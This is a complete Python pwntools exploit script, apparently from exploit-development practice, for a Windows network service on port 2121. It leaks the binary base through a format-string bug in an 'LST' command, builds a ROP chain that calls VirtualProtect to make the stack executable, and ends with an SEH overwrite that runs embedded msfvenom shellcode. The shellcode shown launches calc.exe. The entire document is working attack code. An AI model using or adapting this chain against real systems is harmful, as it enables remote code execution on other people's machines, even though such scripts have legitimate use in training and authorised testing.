#!/usr/bin/python3
from pwn import remote, p32, pause

prefix = b"LST "

shell = remote("Windows", 2121)
shell.sendline(prefix + b"%p.%p.%p.%p")

binary_leak = shell.recvline().decode().split(".")[1]
binary_base = int(binary_leak, 16) - 0x14120

"""
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,     (ESP)
  [in]  SIZE_T dwSize,        (0x1)
  [in]  DWORD  flNewProtect,  (0x40)
  [out] PDWORD lpflOldProtect (&Writable)
);
"""

rop  = b""
rop += p32(binary_base + 0x1010) * 30 # ret;
rop += p32(binary_base + 0x3711a)     # pop eax; ret;
rop += p32(0xa0fe4931)                # 0x40 - 0x5f01b70f
rop += p32(binary_base + 0x2c0b6)     # add eax, 0x5f01b70f; ret;
rop += p32(binary_base + 0x1aba5)     # xchg edx, eax; dec eax; add al, byte ptr [eax]; pop ecx; ret;
rop += p32(binary_base + 0xa635a)     # Writable
rop += p32(binary_base + 0x3711a)     # pop eax; ret;
rop += p32(0xa0fe48f2)                # 0x1 - 0x5f01b70f
rop += p32(binary_base + 0x2c0b6)     # add eax, 0x5f01b70f; ret;
rop += p32(binary_base + 0x113a4)     # xchg ebx, eax; ret;
rop += p32(binary_base + 0x100f)      # pop ebp; ret;
rop += p32(binary_base + 0x100f)      # pop ebp; ret;
rop += p32(binary_base + 0x1068)      # pop esi; ret;
rop += p32(binary_base + 0x14af9)     # jmp eax;
rop += p32(binary_base + 0x15354)     # pop edi; ret;
rop += p32(binary_base + 0x1010)      # ret;
rop += p32(binary_base + 0x3711a)     # pop eax; ret;
rop += p32(binary_base + 0x901bc)     # ReadFile() [- 0x3000 = VirtualProtect()]
rop += p32(binary_base + 0x2bb8e)     # mov eax, dword ptr [eax]; ret;
rop += p32(binary_base + 0x113ab)     # sub eax, 0x1000; ret;
rop += p32(binary_base + 0x113ab)     # sub eax, 0x1000; ret;
rop += p32(binary_base + 0x113ab)     # sub eax, 0x1000; ret;
rop += p32(binary_base + 0x113b1)     # pushad; ret;
rop += p32(binary_base + 0x11394)     # jmp esp;

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d'
shellcode =  b""
shellcode += b"\x33\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\xbd\xaa\x1e\x96\x83\xee\xfc"
shellcode += b"\xe2\xf4\x41\x42\x9c\x96\xbd\xaa\x7e\x1f\x58"
shellcode += b"\x9b\xde\xf2\x36\xfa\x2e\x1d\xef\xa6\x95\xc4"
shellcode += b"\xa9\x21\x6c\xbe\xb2\x1d\x54\xb0\x8c\x55\xb2"
shellcode += b"\xaa\xdc\xd6\x1c\xba\x9d\x6b\xd1\x9b\xbc\x6d"
shellcode += b"\xfc\x64\xef\xfd\x95\xc4\xad\x21\x54\xaa\x36"
shellcode += b"\xe6\x0f\xee\x5e\xe2\x1f\x47\xec\x21\x47\xb6"
shellcode += b"\xbc\x79\x95\xdf\xa5\x49\x24\xdf\x36\x9e\x95"
shellcode += b"\x97\x6b\x9b\xe1\x3a\x7c\x65\x13\x97\x7a\x92"
shellcode += b"\xfe\xe3\x4b\xa9\x63\x6e\x86\xd7\x3a\xe3\x59"
shellcode += b"\xf2\x95\xce\x99\xab\xcd\xf0\x36\xa6\x55\x1d"
shellcode += b"\xe5\xb6\x1f\x45\x36\xae\x95\x97\x6d\x23\x5a"
shellcode += b"\xb2\x99\xf1\x45\xf7\xe4\xf0\x4f\x69\x5d\xf5"
shellcode += b"\x41\xcc\x36\xb8\xf5\x1b\xe0\xc0\x1f\x1b\x38"
shellcode += b"\x18\x1e\x96\xbd\xfa\x76\xa7\x36\xc5\x99\x69"
shellcode += b"\x68\x11\xee\x23\x1f\xfc\x76\x30\x28\x17\x83"
shellcode += b"\x69\x68\x96\x18\xea\xb7\x2a\xe5\x76\xc8\xaf"
shellcode += b"\xa5\xd1\xae\xd8\x71\xfc\xbd\xf9\xe1\x43\xde"
shellcode += b"\xcb\x72\xf5\x93\xcf\x66\xf3\xbd\xaa\x1e\x96"

offset = 1032
junk = b"A" * (offset - len(rop + shellcode))

nseh = b"B" * 4
seh = p32(binary_base + 0x11396) # add esp, 0xe10; ret;

payload  = b""
payload += prefix
payload += rop
payload += shellcode
payload += junk
payload += nseh + seh
payload += b"D" * (3200 - len(payload))

shell.sendline(payload)

pause()
